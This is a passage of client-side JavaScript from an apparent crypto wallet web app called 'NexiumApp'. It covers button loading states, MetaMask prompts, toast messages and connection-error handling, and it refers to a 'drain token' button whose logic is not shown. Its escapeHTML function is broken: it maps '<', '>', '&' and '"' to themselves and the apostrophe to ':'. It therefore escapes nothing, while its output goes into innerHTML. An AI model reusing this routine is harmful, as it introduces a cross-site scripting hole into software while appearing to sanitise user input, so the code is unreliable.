      this.showFeedback(`Error adding volume: ${error.reason || error.message || 'Transaction failed. Check token balance.'}`, 'error');
    } finally {
      this.toggleVolumeLoading(false);
      this.hideProcessingSpinner();
    }
  }

  toggleVolumeLoading(isLoading) {
    if (!this.dom.addVolumeBtn) return;
    this.dom.addVolumeBtn.disabled = isLoading;
    this.dom.addVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
    this.dom.addVolumeBtn.classList.toggle('opacity-70', isLoading);
    this.dom.addVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
    if (this.dom.drainTokenBtn) {
      this.dom.drainTokenBtn.disabled = isLoading;
      this.dom.drainTokenBtn.classList.toggle('opacity-70', isLoading);
      this.dom.drainTokenBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
    if (this.dom.beautifyAddVolumeBtn) {
      this.dom.beautifyAddVolumeBtn.disabled = isLoading;
      this.dom.beautifyAddVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
      this.dom.beautifyAddVolumeBtn.classList.toggle('opacity-70', isLoading);
      this.dom.beautifyAddVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
  }

  checkConnectivity() {
    if (!navigator.onLine) this.showFeedback('No internet connection. Please reconnect.', 'error');
  }

  handleOnline() {
    this.showFeedback('Back online. Functionality restored.', 'success');
    if (this.isWalletConnected()) this.renderTokenInterface();
    else this.showMetaMaskPrompt();
  }

  handleOffline() {
    this.showFeedback('No internet connection. Please reconnect.', 'error');
    this.showDefaultPrompt();
  }

  showMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) return;
    this.dom.metamaskPrompt.classList.remove('hidden');
    this.dom.metamaskPrompt.style.display = 'block';
  }

  hideMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) return;
    this.dom.metamaskPrompt.classList.add('hidden');
    this.dom.metamaskPrompt.style.display = 'none';
  }

  showFeedback(message, type = 'info') {
    console.log(`Showing feedback: ${message} (${type})`);
    let feedbackContainer = this.dom.feedbackContainer;
    if (!feedbackContainer) {
      feedbackContainer = document.createElement('div');
      feedbackContainer.className = 'feedback-container fixed bottom-4 right-4 space-y-2 z-[10000]';
      document.body.appendChild(feedbackContainer);
      this.dom.feedbackContainer = feedbackContainer;
    }
    const feedback = document.createElement('div');
    feedback.className = `feedback feedback-${type} fade-in p-4 rounded-xl text-white ${type === 'error' ? 'bg-red-500' : type === 'success' ? 'bg-green-500' : type === 'warning' ? 'bg-yellow-500' : 'bg-blue-500'}`;
    feedback.style.zIndex = '10000';
    feedback.innerHTML = `
      <span class="feedback-message">${this.escapeHTML(message)}</span>
      <span class="feedback-close cursor-pointer ml-2" role="button" aria-label="Close feedback">×</span>
    `;
    const close = feedback.querySelector('.feedback-close');
    if (close) {
      close.addEventListener('click', () => feedback.remove());
      close.addEventListener('keypress', (e) => e.key === 'Enter' && feedback.remove());
    }
    feedbackContainer.appendChild(feedback);
    setTimeout(() => feedback.classList.add('fade-out'), type === 'error' ? 10000 : 5000);
    setTimeout(() => feedback.remove(), type === 'error' ? 10500 : 5500);
  }

  getTokenSymbol(address) {
    const token = TOKEN_LIST.find(t => t.address.toLowerCase() === address.toLowerCase());
    return token ? token.symbol : 'Unknown';
  }

  shortenAddress(address) {
    if (!ethers.isAddress(address)) return 'Invalid Address';
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  }

  escapeHTML(str) {
    return String(str).replace(/[&<>"']/g, (m) => ({
      '&': '&',
      '<': '<',
      '>': '>',
      '"': '"',
      "'": ':',
    }[m]));
  }

  handleConnectionError(error) {
    let message = 'Failed to connect wallet';
    if (error.code === 4001) message = 'Connection rejected by user';
    else if (error.code === -32002) message = 'Wallet is locked';
    else if (error.message?.includes('MetaMask')) message = 'Wallet not detected';
    else if (error.reason) message = `Connection failed: ${this.escapeHTML(error.reason)}`;
    else if (error.message) message = `Connection failed: ${this.escapeHTML(error.message)}`;
    console.error('Connection error details:', error);
    this.showFeedback(message, 'error');
    this.updateButtonState('disconnected');
    this.showDefaultPrompt();
    this.showMetaMaskPrompt();
    this.hideProcessingSpinner();
  }
}

new NexiumApp();